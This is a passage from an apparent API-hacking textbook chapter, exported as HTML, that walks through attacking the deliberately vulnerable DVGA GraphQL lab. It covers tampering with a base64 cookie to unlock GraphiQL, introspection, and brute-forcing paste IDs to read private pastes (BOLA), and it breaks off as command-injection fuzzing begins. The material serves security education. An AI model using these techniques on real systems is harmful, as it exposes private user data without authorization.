API documentation is normally located on the top right of the page, under a button called Docs. If you click the Docs button, you should see the Documentation Explorer window, shown on the right side of </span><span class="c17 c20"><a class="c3" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c14.xhtml%23figure14-5&amp;sa=D&amp;source=editors&amp;ust=1681144520660640&amp;usg=AOvVaw1bN2I-m5SsQA7I27RMhOGX">Figure 14-5</a></span><span class="c2">. This information could be helpful for crafting requests. Unfortunately, due to our bad request, we do not see any documentation.</span></p><p class="c9"><span class="c7">There is a chance we&rsquo;re not authorized to access the documentation due to the cookies included in our request. Let&rsquo;s see if we can alter the </span><span class="c12">env=graphiql:disable</span><span class="c7">&nbsp;cookie we spotted back at the bottom of </span><span class="c20 c17"><a class="c3" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c14.xhtml%23figure14-2&amp;sa=D&amp;source=editors&amp;ust=1681144520661168&amp;usg=AOvVaw3pRPdIwJ20S8vP3ZlV51cR">Figure 14-2</a></span><span class="c2">.</span></p><h3 class="c21" id="h.lakz3oydovmc"><span class="c5">Cookie Tampering to Enable the GraphiQL IDE</span></h3><p class="c24"><span class="c7">Let&rsquo;s capture a request to </span><span class="c7 c17">/graphiql</span><span class="c7">&nbsp;using the Burp Suite Proxy to see what we&rsquo;re working with. As usual, you can proxy the request to be intercepted through Burp Suite. Make sure Foxy Proxy is on and then refresh the </span><span class="c7 c17">/graphiql</span><span class="c2">&nbsp;page in your browser. Here is the request you should intercept:</span></p><p class="c0"><span class="c6 c11">GET /graphiql HTTP/1.1</span></p><p class="c0"><span class="c6 c11">Host: 192.168.195.132:5000</span></p><p class="c0"><span class="c6 c17">--snip--</span></p><p class="c0"><span class="c6">Cookie: language=en; welcomebanner_status=dismiss; continueCode=KQabVVENkBvjq9O2xgyoWrXb45wGnmTxdaL8m1pzYlPQKJMZ6D37neRqyn3x; cookieconsent_status=dismiss; session=eyJkaWZmaWN1bHR5IjoiZWFzeSJ9.YWOfOA.NYaXtJpmkjyt-RazPrLj5GKg-Os; </span><span class="c4">env=Z3JhcGhpcWw6ZGlzYWJsZQ==</span></p><p class="c0"><span class="c6 c11">Upgrade-Insecure-Requests: 1</span></p><p class="c10"><span class="c6 c11">Cache-Control: max-age=0.</span></p><p class="c9"><span class="c7">In reviewing the request, one thing you should notice is that the </span><span class="c12">env</span><span class="c7">&nbsp;variable is base64 encoded. Paste the value into Burp Suite&rsquo;s Decoder and then decode the value as base64. You should see the decoded value as </span><span class="c12">graphiql:disable</span><span class="c2">. This is the same value we noticed when viewing DVGA in DevTools.</span></p><p class="c9"><span class="c7">Let&rsquo;s take this value and try altering it to </span><span class="c12">graphiql:enable</span><span class="c7">. Since the original value was base64 encoded, let&rsquo;s encode the new value back to base64 (see </span><span class="c20 c17"><a class="c3" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c14.xhtml%23figure14-6&amp;sa=D&amp;source=editors&amp;ust=1681144520663069&amp;usg=AOvVaw2pPnZu0t_b0nNogBk4wIlV">Figure 14-6</a></span><span class="c2">).</span></p><p class="c19"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 466.67px;"><img alt="Screenshot of Burp Suite&rsquo;s Decoder with a string decoded to &ldquo;graphiql:enable&rdquo;" src="images/image15.png" style="width: 624.00px; height: 466.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c18"><span class="c1">Figure 14-6</span><span class="c13">: Burp Suite&rsquo;s Decoder</span></p><p class="c9"><span class="c7">You can test out this updated cookie in Repeater to see what sort of response you receive. To be able to use GraphiQL in the browser, you&rsquo;ll need to update the cookie saved in your browser. Open the DevTools Storage panel to edit the cookie (see </span><span class="c20 c17"><a class="c3" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c14.xhtml%23figure14-7&amp;sa=D&amp;source=editors&amp;ust=1681144520663903&amp;usg=AOvVaw2tjVf5AwR-0Ar8bRl_wG80">Figure 14-7</a></span><span class="c2">).</span></p><p class="c19"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 182.67px;"><img alt="Screenshot of the DevTools storage panel showing a list of cookies and their values" src="images/image12.png" style="width: 624.00px; height: 182.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c18"><span class="c1">Figure 14-7</span><span class="c13">: Cookies in DevTools</span></p><p class="c9"><span class="c7">Once you&rsquo;ve located the </span><span class="c12">env</span><span class="c2">&nbsp;cookie, double-click the value and replace it with the new one. Now return to the GraphiQL IDE and refresh the page. You should now be able to use the GraphiQL interface and Documentation Explorer.</span></p><h3 class="c21" id="h.q1jbeagh2gm"><span class="c5">Reverse Engineering the GraphQL Requests</span></h3><p class="c24"><span class="c2">Although we know the endpoints we want to target, we still don&rsquo;t know the structure of the API&rsquo;s requests. One major difference between REST and GraphQL APIs is that GraphQL operates using POST requests only.</span></p><p class="c9"><span class="c7">Let&rsquo;s intercept these requests in Postman so we can better manipulate them. First, set your browser&rsquo;s proxy to forward traffic to Postman. If you followed the setup instructions back in Chapter 4, you should be able to set FoxyProxy to &ldquo;Postman.&rdquo; </span><span class="c20 c17"><a class="c3" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c14.xhtml%23figure14-8&amp;sa=D&amp;source=editors&amp;ust=1681144520665073&amp;usg=AOvVaw0vJy4leeD58smhaqCX5tmP">Figure 14-8</a></span><span class="c2">&nbsp;shows Postman&rsquo;s Capture requests and cookies screen.</span></p><p class="c19"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 528.00px; height: 610.67px;"><img alt="Screenshot of the Postman &ldquo;Capture requests and cookies&rdquo; page with &ldquo;Capture requests&rdquo; set to On" src="images/image9.png" style="width: 528.00px; height: 610.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c18"><span class="c1">Figure 14-8</span><span class="c13">: Postman&rsquo;s Capture requests and cookies screen</span></p><p class="c9"><span class="c7">Now let&rsquo;s reverse engineer this web application by manually navigating to every link and using every feature we&rsquo;ve discovered. Click around and submit some data. Once you&rsquo;ve thoroughly used the web app, open Postman to see what your collection looks like. You&rsquo;ve likely collected requests that do not interact with the target API. Make sure to delete any that do not include either </span><span class="c7 c17">/graphiql</span><span class="c7">&nbsp;or </span><span class="c7 c17">/graphql</span><span class="c2">.</span></p><p class="c9"><span class="c7">However, as you can see in </span><span class="c20 c17"><a class="c3" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c14.xhtml%23figure14-9&amp;sa=D&amp;source=editors&amp;ust=1681144520665986&amp;usg=AOvVaw39ioJ-ceg-d6XEWMErbiCF">Figure 14-9</a></span><span class="c7">, even if you delete all requests that don&rsquo;t involve </span><span class="c7 c17">/graphql</span><span class="c2">, their purposes aren&rsquo;t so clear. In fact, many of them look identical. Because GraphQL requests function solely using the data in the body of the POST request rather than the request&rsquo;s endpoint, we&rsquo;ll have to review the body of the request to get an idea of what these requests do.</span></p><p class="c19"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 548.00px; height: 334.67px;"><img alt="Screenshot of identical-looking POST requests saved in Postman" src="images/image7.png" style="width: 548.00px; height: 334.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c18"><span class="c1">Figure 14-9</span><span class="c13">: An unclear GraphQL Postman collection</span></p><p class="c9"><span class="c2">Take the time to go through the body of each of these requests and then rename each request so you can see what it does. Some of the request bodies may seem intimidating; if so, extract a few key details from them and give them a temporary name until you understand them better. For instance, take the following request:</span></p><p class="c0"><span class="c6 c11">POST http://192.168.195.132:5000/graphiql?</span></p><p class="c0 c14"><span class="c6 c11"></span></p><p class="c0"><span class="c6 c11">{&quot;query&quot;:&quot;\n &nbsp;query IntrospectionQuery {\n &nbsp; &nbsp;__schema {\n &nbsp; &nbsp; &nbsp;queryType{ name }\n &nbsp; &nbsp; &nbsp;mutationType { name }\n &nbsp; &nbsp; &nbsp;subscriptionType { name }\n</span></p><p class="c10"><span class="c6 c16">--snip--</span></p><p class="c9"><span class="c7">There is a lot of information here, but we can pick out a few details from the beginning of the request body and give it a name (for example, Graphiql Query Introspection SubscriptionType). The next request looks very similar, but instead of </span><span class="c12">subscriptionType</span><span class="c7">, the request includes only </span><span class="c12">types</span><span class="c7">, so let&rsquo;s name it based on that difference, as shown in </span><span class="c20 c17"><a class="c3" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c14.xhtml%23figure14-10&amp;sa=D&amp;source=editors&amp;ust=1681144520667479&amp;usg=AOvVaw23vr0qkDV4VuYllJvdb66E">Figure 14-10</a></span><span class="c2">.</span></p><p class="c19"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 421.33px; height: 330.67px;"><img alt="Screenshot of a list of POST requests renamed descriptively in Postman" src="images/image10.png" style="width: 421.33px; height: 330.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c18"><span class="c1">Figure 14-10</span><span class="c13">: A cleaned-up DVGA collection</span></p><p class="c9"><span class="c2">Now you have a basic collection with which to conduct testing. As you learn more about the API, you will further build your collection.</span></p><p class="c9"><span class="c2">Before we continue, we&rsquo;ll cover another method of reverse engineering GraphQL requests: obtaining the schema using introspection.</span></p><h3 class="c21" id="h.f31lzbz2ab78"><span class="c5">Reverse Engineering a GraphQL Collection Using Introspection</span></h3><p class="c24"><span class="c2">Introspection is a feature of GraphQL that reveals the API&rsquo;s entire schema to the consumer, making it a gold mine when it comes to information disclosure. For this reason, you&rsquo;ll often find introspection disabled and will have to work a lot harder to attack the API. If, however, you can query the schema, you&rsquo;ll be able to operate as though you&rsquo;ve found a collection or specification file for a REST API.</span></p><p class="c9"><span class="c7">Testing for introspection is as simple as sending an introspection query. If you&rsquo;re authorized to use the DVGA GraphiQL interface, you can capture the introspection query by intercepting the requests made when loading </span><span class="c7 c17">/graphiql</span><span class="c2">, because the GraphiQL interface sends an introspection query when populating the Documentation Explorer.</span></p><p class="c9"><span class="c7">The full introspection query is quite large, so I&rsquo;ve only included a portion here; however, you can see it in its entirety by intercepting the request yourself or checking it out on the Hacking APIs GitHub repo at </span><span class="c20 c17"><a class="c3" href="https://www.google.com/url?q=https://github.com/hAPI-hacker/Hacking-APIs&amp;sa=D&amp;source=editors&amp;ust=1681144520668735&amp;usg=AOvVaw13__jvUu2xz-8_lLq1SZTC">https://github.com/hAPI-hacker/Hacking-APIs</a></span><span class="c2">.</span></p><p class="c0"><span class="c6 c11">&nbsp;query IntrospectionQuery {</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; __schema {</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; queryType { name }</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; mutationType { name }</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; subscriptionType { name }</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; types {</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; &nbsp; ...FullType</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; }</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; directives {</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; &nbsp; name</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; &nbsp; description</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; &nbsp; locations</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; &nbsp; args {</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ...InputValue</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; &nbsp; }</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; }</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; }</span></p><p class="c10"><span class="c6 c11">&nbsp; }</span></p><p class="c9"><span class="c2">A successful GraphQL introspection query will provide you with all the types and fields contained within the schema. You can use the schema to build a Postman collection. If you&rsquo;re using GraphiQL, the query will populate the GraphiQL Documentation Explorer. As you&rsquo;ll see in the next sections, the GraphiQL Documentation Explorer is a tool for seeing the types, fields, and arguments available in the GraphQL documentation.</span></p><h2 class="c21" id="h.fwntx118tv9r"><span class="c23 c11">GraphQL API Analysis</span></h2><p class="c24"><span class="c2">At this point, we know that we can make requests to a GraphQL endpoint and the GraphiQL interface. We&rsquo;ve also reverse engineered several GraphQL requests and gained access to the GraphQL schema through the use of a successful introspection query. Let&rsquo;s use the Documentation Explorer to see if there is any information we might leverage for exploitation.</span></p><h3 class="c21" id="h.icxlbdc5ex93"><span class="c5">Crafting Requests Using the GraphiQL Documentation Explorer</span></h3><p class="c24"><span class="c7">Take one of the requests we reverse engineered from Postman, such as the request for Public Pastes used to generate the </span><span class="c7 c17">public_pastes</span><span class="c7">&nbsp;web page, and test it out using the GraphiQL IDE. Use the Documentation Explorer to help you build your query. Under </span><span class="c15">Root Types</span><span class="c7">, select </span><span class="c15">Query</span><span class="c7">. You should see the same options displayed in </span><span class="c20 c17"><a class="c3" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c14.xhtml%23figure14-11&amp;sa=D&amp;source=editors&amp;ust=1681144520671235&amp;usg=AOvVaw3FHwrgU8T4syzMI6VN_P6J">Figure 14-11</a></span><span class="c2">.</span></p><p class="c19"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 425.33px;"><img alt="Screenshot of the GraphiQL IDE with a search bar open and information about query formats visible" src="images/image16.png" style="width: 624.00px; height: 425.33px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c18"><span class="c1">Figure 14-11</span><span class="c13">: The GraphiQL Documentation Explorer</span></p><p class="c9"><span class="c7">Using the GraphiQL query panel, enter </span><span class="c12">query</span><span class="c7">&nbsp;followed by curly brackets to initiate the GraphQL request. Now query for the public pastes field by adding </span><span class="c12">pastes</span><span class="c7">&nbsp;under </span><span class="c12">query</span><span class="c7">&nbsp;and using parentheses for the argument </span><span class="c12">public: true</span><span class="c7">. Since we&rsquo;ll want to know more about the public pastes object, we&rsquo;ll need to add fields to the query. Each field we add to the request will tell us more about the object. To do this, select </span><span class="c15">PasteObject</span><span class="c7">&nbsp;in the Documentation Explorer to view these fields. Finally, add the fields that you would like to include in your request body, separated by new lines. The fields you include represent the different data objects you should receive back from the provider. In my request I&rsquo;ll add </span><span class="c12">title</span><span class="c7">, </span><span class="c12">content</span><span class="c7">, </span><span class="c12">public</span><span class="c7">, </span><span class="c12">ipAddr</span><span class="c7">, and </span><span class="c12">pId</span><span class="c2">, but feel free to experiment with your own fields. Your completed request body should look like this:</span></p><p class="c0"><span class="c6 c11">query {</span></p><p class="c0"><span class="c6 c11">pastes (public: true) {</span></p><p class="c0"><span class="c6 c11">&nbsp;title</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp;content</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp;public</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp;ipAddr</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp;pId</span></p><p class="c0"><span class="c6 c11">&nbsp; }</span></p><p class="c10"><span class="c6 c11">}</span></p><p class="c9"><span class="c7">Send the request by using the </span><span class="c15">Execute Query</span><span class="c2">&nbsp;button or the shortcut CTRL-ENTER. If you&rsquo;ve followed along, you should receive a response like the following:</span></p><p class="c0"><span class="c6 c11">{</span></p><p class="c0"><span class="c6 c11">&nbsp; &quot;data&quot;: {</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &quot;pastes&quot;: [</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; {</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; &nbsp; &quot;id&quot;: &quot;UGFzdGVPYmplY3Q6MTY4&quot;,</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; &nbsp; &quot;content&quot;: &quot;testy&quot;,</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; &nbsp; &quot;ipAddr&quot;: &quot;192.168.195.133&quot;,</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; &nbsp; &quot;pId&quot;: &quot;166&quot;</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; },</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; {</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; &nbsp; &quot;id&quot;: &quot;UGFzdGVPYmplY3Q6MTY3&quot;,</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; &nbsp; &quot;content&quot;: &quot;McTester&quot;,</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; &nbsp; &quot;ipAddr&quot;: &quot;192.168.195.133&quot;,</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; &nbsp; &quot;pId&quot;: &quot;165&quot;</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; }</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp;}</span></p><p class="c10"><span class="c6 c11">}</span></p><p class="c9"><span class="c2">Now that you have an idea of how to request data using GraphQL, let&rsquo;s transition to Burp Suite and use a great extension to help us flesh out what can be done with DVGA.</span></p><h3 class="c21" id="h.yfpqyad1rjft"><span class="c5">Using the InQL Burp Extension</span></h3><p class="c24"><span class="c2">Sometimes, you won&rsquo;t find any GraphiQL IDE to work with on your target. Luckily for us, an amazing Burp Suite extension can help. InQL acts as an interface to GraphQL within Burp Suite. To install it, as you did for the IP Rotate extension in the previous chapter, you&rsquo;ll need to select Jython in the Extender options. Refer to Chapter 13 for the Jython installation steps.</span></p><p class="c9"><span class="c7">Once you&rsquo;ve installed InQL, select the InQL Scanner and add the URL of the GraphQL API you&rsquo;re targeting (see </span><span class="c20 c17"><a class="c3" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c14.xhtml%23figure14-12&amp;sa=D&amp;source=editors&amp;ust=1681144520676641&amp;usg=AOvVaw2CDp0Gm3XFxzheek7snYPh">Figure 14-12</a></span><span class="c2">).</span></p><p class="c9"><span class="c2">The scanner will automatically find various queries and mutations and save them into a file structure. You can then select these saved requests and send them to Repeater for additional testing.</span></p><p class="c19"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 400.00px;"><img alt="Screenshot of the InQL screenshot in Burp with the paste.query GraphQL query visible" src="images/image2.png" style="width: 624.00px; height: 400.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c18"><span class="c1">Figure 14-12</span><span class="c13">: The InQL Scanner module in Burp Suite</span></p><p class="c9"><span class="c7">Let&rsquo;s practice testing different requests. The </span><span class="c12">paste.query</span><span class="c2">&nbsp;is a query used to find pastes by their paste ID (pID) code. If you posted any public pastes in the web application, you can see your pID values. What if we used an authorization attack against the pID field by requesting pIDs that were meant to be private? This would constitute a BOLA attack. Since these paste IDs appear to be sequential, we&rsquo;ll want to test for any authorization restrictions preventing us from accessing the private posts of other users.</span></p><p class="c9"><span class="c7">Right-click </span><span class="c12">paste.query</span><span class="c7">&nbsp;and send it to Repeater. Edit the </span><span class="c12">code*</span><span class="c2">&nbsp;value by replacing it with a pID that should work. I&rsquo;ll use the pID 166, which I received earlier. Send the request with Repeater. You should receive a response like the following:</span></p><p class="c0"><span class="c6 c11">HTTP/1.0 200 OK</span></p><p class="c0"><span class="c6 c11">Content-Type: application/json</span></p><p class="c0"><span class="c6 c11">Content-Length: 319</span></p><p class="c0"><span class="c6 c11">Vary: Cookie</span></p><p class="c0"><span class="c6 c11">Server: Werkzeug/1.0.1 Python/3.7.10</span></p><p class="c0 c14"><span class="c6 c11"></span></p><p class="c0"><span class="c6 c11">{</span></p><p class="c0"><span class="c6 c11">&nbsp; &quot;data&quot;: {</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &quot;paste&quot;: {</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; &quot;owner&quot;: {</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; &nbsp; &quot;id&quot;: &quot;T3duZXJPYmplY3Q6MQ==&quot;</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; },</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; &quot;burn&quot;: false,</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; &quot;Owner&quot;: {</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; &nbsp; &quot;id&quot;: &quot;T3duZXJPYmplY3Q6MQ==&quot;</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; },</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; &quot;userAgent&quot;: &quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Firefox/78.0&quot;,</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; &quot;pId&quot;: &quot;166&quot;,</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; &quot;title&quot;: &quot;test3&quot;,</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; &quot;ownerId&quot;: 1,</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; &quot;content&quot;: &quot;testy&quot;,</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; &quot;ipAddr&quot;: &quot;192.168.195.133&quot;,</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; &quot;public&quot;: true,</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; &quot;id&quot;: &quot;UGFzdGVPYmplY3Q6MTY2&quot;</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; }</span></p><p class="c0"><span class="c6 c11">&nbsp; }</span></p><p class="c10"><span class="c6 c11">}</span></p><p class="c9"><span class="c2">Sure enough, the application responds with the public paste I had previously submitted.</span></p><p class="c9"><span class="c7">If we&rsquo;re able to request pastes by pID, maybe we can brute-force the other pIDs to see if there are authorization requirements that prevent us from requesting private pastes. Send the paste request in </span><span class="c20 c17"><a class="c3" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c14.xhtml%23figure14-12&amp;sa=D&amp;source=editors&amp;ust=1681144520682176&amp;usg=AOvVaw1wGpuct5N4i3gj5nKLLd_Q">Figure 14-12</a></span><span class="c2">&nbsp;to Intruder and then set the pID value to be the payload position. Change the payload to a number value starting at 0 and going to 166 and then start the attack.</span></p><p class="c9"><span class="c7">Reviewing the results reveals that we&rsquo;ve discovered a BOLA vulnerability. We can see that we&rsquo;ve received private data, as indicated by the </span><span class="c12">&quot;public&quot;: false</span><span class="c2">&nbsp;field:</span></p><p class="c0"><span class="c6 c11">{</span></p><p class="c0"><span class="c6 c11">&nbsp; &quot;data&quot;: {</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &quot;paste&quot;: {</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; &quot;owner&quot;: {</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; &nbsp; &quot;id&quot;: &quot;T3duZXJPYmplY3Q6MQ==&quot;</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; },</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; &quot;burn&quot;: false,</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; &quot;Owner&quot;: {</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; &nbsp; &quot;id&quot;: &quot;T3duZXJPYmplY3Q6MQ==&quot;</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; },</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; &quot;userAgent&quot;: &quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Firefox/78.0&quot;,</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; &quot;pId&quot;: &quot;63&quot;,</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; &quot;title&quot;: &quot;Imported Paste from URL - b9ae5f&quot;,</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; &quot;ownerId&quot;: 1,</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; &quot;content&quot;: &quot;&lt;!DOCTYPE html&gt;\n&lt;html lang=en&gt; &quot;,</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; &quot;ipAddr&quot;: &quot;192.168.195.133&quot;,</span></p><p class="c0"><span class="c6">&nbsp; &nbsp; &nbsp; </span><span class="c4">&quot;public&quot;: false,</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; &nbsp; &quot;id&quot;: &quot;UGFzdGVPYmplY3Q6NjM=&quot;</span></p><p class="c0"><span class="c6 c11">&nbsp; &nbsp; }</span></p><p class="c0"><span class="c6 c11">&nbsp; }</span></p><p class="c10"><span class="c6 c11">}</span></p><p class="c9"><span class="c2">We&rsquo;re able to retrieve every private paste by requesting different pIDs. Congratulations, this is a great find! Let&rsquo;s see what else we can discover.</span></p><h2 class="c21" id="h.aqk65nubzmmy"><span class="c23 c11">Fuzzing for Command Injection</span></h2><p class="c24"><span class="c2">Now that we&rsquo;ve analyzed the API, let&rsquo;s fuzz it for vulnerabilities to see if we can conduct an attack. Fuzzing GraphQL can pose an additional challenge, as most requests result in a 200 status code, even if they were formatted incorrectly. Therefore, we&rsquo;ll need to look for other indicators of success.</span></p><p class="c9"><span class="c2">You&rsquo;ll find any errors in the response body, and you&rsquo;ll need to build a baseline for what these look like by reviewing the responses. Check whether errors all generate the same response length, for example, or if there are other significant differences between a successful response and a failed one. Of course, you should also review error responses for information disclosures that can aid your attack.</span></p><p class="c9"><span class="c7">Since the query type is essentially read-only, we&rsquo;ll attack the mutation request types. First, let&rsquo;s take one of the mutation requests, such as the </span><span class="c12">Mutation ImportPaste</span><span class="c7">&nbsp;request, in our DVGA collection and intercept it with Burp Suite. You should see an interface similar to </span><span class="c20 c17"><a class="c3" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c14.xhtml%23figure14-13&amp;sa=D&amp;source=editors&amp;ust=1681144520685722&amp;usg=AOvVaw1icez9LnXeAPVcTHC_VyS3">Figure 14-13</a></span><span class="c2">.</span></p><p class="c19"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 394.67px;"><img alt="Screenshot of a POST request in Burp Suite with a GraphQL query in the request body" src="images/image11.png" style="width: 624.00px; height: 394.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c18"><span class="c1">Figure 14-13</span><span class="c13">: An intercepted GraphQL mutation request</span></p><p class="c9"><span class="c2">Send this request to Repeater to see the sort of response we should expect to see. You should receive a response like the following:</span></p><p class="c0"><span class="c6 c11">HTTP/1.0 200 OK</span></p><p class="c0"><span class="c6 c11">Content-Type: application/json</span></p><p class="c0"><span class="c6 c17">--snip--</span></p><p class="c0 c14"><span class="c6 c11"></span></p><p class="c0"><span class="c6 c11">{&quot;data&quot;:{&quot;importPaste&quot;:{</span></p><p class="c10"><span class="c6">&quot;result&quot;:&quot;&lt;HTML&gt;&lt;HEAD&gt;&lt;meta http-equiv=\&quot;content-type\&quot;content=\&quot;text/html;charset=utf-8\&quot;&gt;\n&lt;TITLE&gt;301 